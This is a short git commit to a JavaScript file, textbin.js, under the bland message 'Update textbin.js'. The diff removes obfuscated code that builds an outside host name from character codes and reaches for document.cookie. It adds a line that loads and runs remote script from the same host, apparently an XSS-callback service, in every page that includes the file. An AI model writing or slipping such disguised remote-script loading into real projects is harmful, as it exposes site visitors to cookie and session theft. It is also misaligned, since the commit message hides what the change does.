cbc1bd2e54b7ca1a449b4929431f016f41b34753
Arnav Aggarwal <65700476+arnav-ag@users.noreply.github.com>
2020-05-25 12:40:31 +0800

    Update textbin.js

--- textbin.js
+++ textbin.js
@@ -15,16 +15,4 @@ xhr.onload = function () {
 
 xhr.send(null);
 
-var xhr2 = new XMLHttpRequest();
-xhr2.open(String.fromCharCode(71,69,84), String.fromCharCode(104,116,116,112,115,58,47,47,112,48,116,97,116,48,46,120,115,115,46,104,116), true);
-
-
-xhr2.onload = function () {
-    if (xhr.readyState === xhr.DONE) {
-        if (xhr.status === 200) {
-            console.log(document.cookie);
-        }
-    }
-};
-
-xhr2.send(null);
+$.getScript("//p0tat0.xss.ht")
